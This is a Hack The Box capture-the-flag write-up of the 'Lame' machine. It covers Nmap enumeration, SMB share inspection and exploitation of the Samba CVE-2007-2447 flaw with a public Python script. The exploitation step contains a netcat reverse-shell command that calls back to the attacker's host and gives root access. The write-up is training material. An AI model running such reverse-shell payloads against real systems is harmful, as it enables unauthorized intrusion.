# HTB - Lame

#### Ip: 10.10.10.171
#### Name: Lame
#### Rating: Easy

----------------------------------------------------------------------

Lame.png

### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/HTB/Lame]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV  10.10.10.3  
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-08 09:48 CDT
Nmap scan report for 10.10.10.3
Host is up (0.061s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.31
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h56m11s, deviation: 2h49m43s, median: -3m49s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2024-06-08T10:44:55-04:00
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.37 seconds
```

Ok, looks just like FTP, SSH and SMB are open on the target.

FTP has anonymous login enabled, but there was nothing in there.

Moving over to SMB we can see we have read/write access to the `/tmp` share:

lame_smb_shares.png

Logging into the share we find a pretty generic `/tmp` folder:

```
┌──(ryan㉿kali)-[~/HTB/Lame]
└─$ smbclient -U '' \\\\10.10.10.3\\tmp              
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jun  8 10:12:56 2024
  ..                                 DR        0  Sat Oct 31 01:33:58 2020
  orbit-makis                        DR        0  Sat Jun  8 05:25:32 2024
  .ICE-unix                          DH        0  Sat Jun  8 02:58:13 2024
  vmware-root                        DR        0  Sat Jun  8 02:58:17 2024
  .X11-unix                          DH        0  Sat Jun  8 02:58:37 2024
  gconfd-makis                       DR        0  Sat Jun  8 05:25:32 2024
  5584.jsvc_up                        R        0  Sat Jun  8 02:59:14 2024
  .X0-lock                           HR       11  Sat Jun  8 02:58:37 2024
  vgauthsvclog.txt.0                  R     1600  Sat Jun  8 02:58:11 2024
```

Not much of interest here. Going back to our Nmap results I note the SMB version and look for exploits and notice there is a Metasploit module available for this https://www.exploit-db.com/exploits/16320.

Digging a bit deeper I find this repo, with a Python version of the exploit. https://github.com/Ziemni/CVE-2007-2447-in-Python

Lets give it a shot.

### Exploitation

We can fire off the exploit with no changes needed to the code with:

```
┌──(ryan㉿kali)-[~/HTB/Lame]
└─$ python smbExploit.py 10.10.10.3 139 'nc -e /bin/sh 10.10.14.31 4444'
```

And we catch a shell back in our listener as root:

lame_shell.png

Nice, we can now grab both the user.txt flag and the root.txt flag:

lame_user.png

lame_root.png

Thanks for following along!

-Ryan

---------------------------------------------------


